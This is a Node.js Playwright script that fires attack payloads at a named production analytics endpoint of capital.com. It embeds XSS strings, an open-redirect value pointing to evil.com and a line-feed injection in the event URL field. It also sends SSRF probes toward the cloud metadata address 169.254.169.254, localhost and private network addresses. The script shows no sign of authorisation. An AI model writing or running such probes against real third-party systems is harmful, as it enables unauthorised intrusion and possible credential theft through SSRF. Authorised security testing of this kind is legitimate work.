const { chromium } = require('playwright');
(async () => {
  const browser = await chromium.launch({ headless: true });
  const page = await browser.newPage();
  const base = 'https://api-website.capital.com';
  
  // The working payload structure - just domReady event, no compression
  const baseEvent = {
    eventName: 'domReady',
    timestamp: 1774461162533,
    timezone: 0,
    type: 'dom-ready',
    url: 'https://capital.com/en-gb',
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    deviceId: 'test-device-id',
    requestId: 'test-request-id'
  };
  
  // Test XSS in URL - try parameter pollution / XSS
  const xssPayloads = [
    { name: 'XSS in URL', url: 'https://capital.com/en-gb?q=<img src=x onerror=alert(1)>' },
    { name: 'XSS in URL quote break', url: 'https://capital.com/en-gb?q="onload=alert(1)"' },
    { name: 'Open redirect in URL', url: 'https://capital.com/en-gb?q=https://evil.com' },
    { name: 'LF injection in URL', url: 'https://capital.com/en-gb?q=test%0aalert(1)' },
  ];
  
  for (const tc of xssPayloads) {
    const event = { ...baseEvent, url: tc.url };
    const encoded = Buffer.from(JSON.stringify([event])).toString('base64');
    try {
      const r = await page.request.post(base + '/api/v2/service-point/sync', {
        data: encoded,
        headers: { 'Content-Type': 'application/json' },
        timeout: 5000
      });
      const ct = r.headers()['content-type'] || '';
      const t = await r.text();
      console.log(r.status() + ' | ' + tc.name + ' | ' + t.slice(0, 100));
    } catch (e) {
      console.log('ERR | ' + tc.name);
    }
  }
  
  // Now test with GZIP compression (like the real analytics payloads)
  const zlib = require('zlib');
  
  const gzipPayload = zlib.gzipSync(Buffer.from(JSON.stringify([baseEvent])));
  const gzipB64 = gzipPayload.toString('base64');
  
  // Test normal gzip payload works
  console.log('\n=== GZIP-compressed test ===');
  try {
    const r = await page.request.post(base + '/api/v2/service-point/sync', {
      data: gzipB64,
      headers: { 'Content-Type': 'application/json' },
      timeout: 5000
    });
    console.log('GZIP status: ' + r.status() + ' | ' + (await r.text()).slice(0, 100));
  } catch (e) {
    console.log('ERR GZIP: ' + e.message.slice(0, 60));
  }
  
  // Try SSRF - internal IP in URL
  console.log('\n=== SSRF tests ===');
  const ssrfPayloads = [
    'http://169.254.169.254/latest/meta-data/',
    'http://127.0.0.1:80/admin',
    'http://192.168.1.1:80/',
    'http://localhost:8080/',
  ];
  
  for (const target of ssrfPayloads) {
    const event = { ...baseEvent, url: target };
    const encoded = Buffer.from(JSON.stringify([event])).toString('base64');
    try {
      const r = await page.request.post(base + '/api/v2/service-point/sync', {
        data: encoded,
        headers: { 'Content-Type': 'application/json' },
        timeout: 5000
      });
      const t = await r.text();
      console.log(r.status() + ' | SSRF target: ' + target + ' | ' + t.slice(0, 80));
    } catch (e) {
      console.log('ERR | SSRF: ' + target);
    }
  }
  
  await browser.close();
})().catch(e => { console.error(e.message); process.exit(1); });
